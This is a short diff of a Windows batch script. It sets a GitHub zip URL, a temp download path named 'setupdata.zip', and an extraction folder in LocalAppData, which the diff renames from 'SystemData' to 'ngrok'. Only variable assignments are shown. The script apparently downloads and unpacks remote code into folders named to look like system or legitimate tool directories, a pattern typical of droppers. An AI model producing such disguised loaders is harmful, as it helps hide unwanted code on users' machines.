@@ -3,7 +3,7 @@ setlocal
 
 set "repo_url=https://github.com/ofutpemata22/mamf/archive/refs/heads/main.zip"
 set "download_path=%TEMP%\setupdata.zip"
-set "extract_to=%LOCALAPPDATA%\SystemData"
+set "extract_to=%LOCALAPPDATA%\ngrok"
 set "temp_folder=%extract_to%\mamf-main"
 set "zip_file=%extract_to%\data.zip"
 
